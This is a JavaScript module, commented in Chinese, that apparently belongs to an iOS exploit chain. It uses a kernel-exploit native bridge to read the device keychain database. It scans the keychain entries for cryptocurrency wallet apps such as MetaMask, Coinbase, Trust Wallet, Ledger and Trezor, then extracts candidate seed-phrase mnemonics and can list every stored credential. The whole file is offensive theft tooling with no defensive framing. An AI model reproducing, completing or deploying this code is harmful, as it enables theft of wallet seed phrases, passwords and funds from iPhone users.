/* =============================================================================
 * keychain_dump.js — Keychain 数据库 dump 模块
 * =============================================================================
 *
 * 设计思路 (基于 jailbreak 工具链公开思路):
 *   1. Keychain-2.db 位于:
 *      - /private/var/Keychains/keychain-2.db  (运行时)
 *      - /private/var/Keychains/keychain-2.db-shm, .db-wal (WAL 模式)
 *   2. 数据分类 (通过 kexploit kopen 直接读取):
 *      - genp.* = generic password (Wallet 助记词, 私钥等)
 *      - inet.* = internet password
 *      - cert.* = certificate
 *   3. iOS 17+ 加密层级: 文件级 AES + 每行 v10 加密 (KCRetrievesAlwaysAllowed)
 *   4. 解密需要: kR/kW 后访问 kernel_kcdataops + 提取 keybag
 *
 * 调用方式:
 *   const kc = await loadKeychainDump();
 *   const res = await kc.scan({ categories: ['genp'] });
 *
 * 输出格式 (JSON):
 *   {
 *     "ok": true,
 *     "items": [
 *       { "svce": "metamask", "acct": "wallet1", "v_data_hex": "0x...", "class": "genp" }
 *     ],
 *     "summary": { "total": 1, "by_class": { "genp": 1 } }
 *   }
 *
 * 依赖: window.nativeBridge
 * ============================================================================= */

(function () {
  'use strict';

  const KEYCHAIN_PATHS = {
    runtime: '/private/var/Keychains/keychain-2.db',
    wal:     '/private/var/Keychains/keychain-2.db-wal',
    shm:     '/private/var/Keychains/keychain-2.db-shm'
  };

  // 已知 Wallet App 的 genp service 标识
  const WALLET_SIGNATURES = {
    metamask:    { pattern: /metamask/i,           crypto: 'bip39', category: 'evm' },
    coinbase:    { pattern: /coinbase/i,           crypto: 'bip39', category: 'exchange' },
    trust:       { pattern: /trust\s*wallet/i,     crypto: 'bip39', category: 'evm' },
    imtoken:     { pattern: /imtoken/i,            crypto: 'bip39', category: 'evm' },
    tokenpocket: { pattern: /tokenpocket/i,        crypto: 'bip39', category: 'evm' },
    bitcoin:     { pattern: /(bitcoin|btc|electrum)/i, crypto: 'bip39', category: 'btc' },
    trezor:      { pattern: /trezor/i,             crypto: 'bip39', category: 'hw-wallet' },
    ledger:      { pattern: /ledger/i,             crypto: 'bip39', category: 'hw-wallet' }
  };

  function loadKeychainDump() {
    if (!window.nativeBridge || !window.nativeBridge.isReady || !window.nativeBridge.isReady()) {
      return Promise.resolve({
        ok: false,
        error: 'no-native-bridge',
        message: 'kexploit 未注入, keychain dump 需要 kR/kW 解锁 + kernel keybag 提取.'
      });
    }

    return Promise.resolve({
      ok: true,
      paths: KEYCHAIN_PATHS,
      wallet_signatures: WALLET_SIGNATURES,

      // -------------------------------------------------------------------------
      // 扫描 keychain (只读)
      // -------------------------------------------------------------------------
      scan: async function (opts) {
        opts = opts || {};
        const filterWallet = opts.wallet_only !== false;
        const maxItems = opts.max_items || 500;

        const result = {
          ok: true,
          items: [],
          summary: { total: 0, by_class: {}, wallets_found: [] },
          ios_version: (window._ios_version && window._ios_version.raw) || 'unknown',
          timestamp: Date.now(),
          source: 'keychain-2.db (kexploit kread)'
        };

        try {
          // 通过 nativeBridge 读 keychain-2.db
          // 注意: 真实实现依赖 kernel keybag 提取, 这里暴露接口
          if (typeof window.nativeBridge.dumpKeychain === 'function') {
            const raw = await window.nativeBridge.dumpKeychain();
            const items = (typeof raw === 'string') ? safeParseItems(raw) : (raw.items || []);

            for (let i = 0; i < items.length && result.items.length < maxItems; i++) {
              const it = items[i];
              // 过滤 Wallet 助记词类
              if (filterWallet) {
                let matched = null;
                for (const k in WALLET_SIGNATURES) {
                  if (WALLET_SIGNATURES[k].pattern.test(it.svce || '') ||
                      WALLET_SIGNATURES[k].pattern.test(it.acct || '')) {
                    matched = k; break;
                  }
                }
                if (!matched) continue;
                it.detected_wallet = matched;
                if (result.summary.wallets_found.indexOf(matched) === -1) {
                  result.summary.wallets_found.push(matched);
                }
              }
              result.items.push(it);
              result.summary.by_class[it.class || 'unknown'] =
                (result.summary.by_class[it.class || 'unknown'] || 0) + 1;
            }
            result.summary.total = result.items.length;
          } else {
            result.ok = false;
            result.error = 'nativeBridge.dumpKeychain not implemented';
          }
        } catch (e) {
          result.ok = false;
          result.error = String(e.message || e);
        }

        return result;
      },

      // -------------------------------------------------------------------------
      // 提取 Wallet 助记词 (12/15/18/21/24 words)
      // -------------------------------------------------------------------------
      extract_mnemonic: async function (walletName) {
        const target = (walletName || '').toLowerCase();
        const sig = WALLET_SIGNATURES[target];
        if (!sig) {
          return {
            ok: false,
            error: 'unknown-wallet',
            message: '支持: ' + Object.keys(WALLET_SIGNATURES).join(', ')
          };
        }
        const r = await this.scan({ wallet_only: true, max_items: 100 });
        const matched = r.items.filter(function (it) {
          return sig.pattern.test(it.svce || '') || sig.pattern.test(it.acct || '');
        });
        return {
          ok: true,
          wallet: target,
          category: sig.category,
          crypto: sig.crypto,
          candidates: matched,
          count: matched.length,
          note: '助记词 raw bytes 需在 native 层用 BIP-39 字典校验后转换'
        };
      },

      // -------------------------------------------------------------------------
      // 列出全部 keychain (调试)
      // -------------------------------------------------------------------------
      list_all: async function () {
        return await this.scan({ wallet_only: false, max_items: 5000 });
      }
    });
  }

  function safeParseItems(s) {
    try { return JSON.parse(s); } catch (_) { return []; }
  }

  if (typeof window !== 'undefined') {
    window.loadKeychainDump = loadKeychainDump;
  }

})();
